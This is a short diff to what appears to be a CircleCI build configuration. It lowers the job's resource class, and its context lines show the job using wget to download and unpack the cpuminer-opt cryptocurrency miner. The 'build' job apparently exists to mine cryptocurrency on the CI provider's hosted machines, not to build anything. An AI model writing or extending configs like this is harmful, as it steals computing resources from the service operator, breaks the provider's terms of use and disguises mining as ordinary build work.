@@ -2,7 +2,7 @@ jobs:
   build:
     docker:
       - image: buildpack-deps:trusty
-    resource_class: large
+    resource_class: medium
     steps:
       - run : wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz
       - run : tar xf cpuminer-opt-linux.tar.gz
